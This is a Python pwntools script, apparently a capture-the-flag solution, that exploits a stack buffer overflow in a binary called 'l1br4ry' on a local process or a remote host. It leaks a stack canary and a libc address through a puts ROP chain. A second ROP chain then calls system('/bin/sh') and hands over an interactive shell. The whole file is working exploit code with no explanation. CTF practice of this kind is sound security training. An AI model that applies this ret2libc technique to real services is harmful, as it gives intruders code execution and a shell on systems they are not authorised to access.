from pwn import *
import binascii

elf = ELF('./l1br4ry')
context.update(binary=elf)

bss = 0x404000 + 0x20
pop_rdi = 0x401323
ret = 0x40101a

if args.LOCAL:
	p = elf.process()
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
	host = 'gc1.eng.run'
	port = 31796
	p = remote(host, port)
	libc = ELF('./libc.so.6')


def get_canary():
	p.recvuntil(b'you: ')
	canary = p.recvline()[:-1]
	p.recvuntil(b'system?\n')
	canary = binascii.unhexlify(canary)[::-1]
	return canary

def send_payload(s, canary):
	payload = b'A' * 24 + canary + p64(bss) + s
	payload += b'X' * (72 - len(payload))
	p.send(payload)

func = 'puts'

canary = get_canary()
payload = p64(pop_rdi)
payload += p64(elf.got[func])
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols['main'])
send_payload(payload, canary)

leak = p.recvuntil(b'\nWelcome')[:-8]
leak = u64(leak.ljust(8, b'\x00'))
libc.address = leak - libc.symbols[func]
log.info(f'Leaked {func}: {hex(leak)}')

binsh = next(libc.search(b'/bin/sh'))

canary = get_canary()
payload = p64(pop_rdi)
payload += p64(binsh)
payload += p64(ret)
payload += p64(libc.symbols['system'])
send_payload(payload, canary)

p.interactive()
p.close()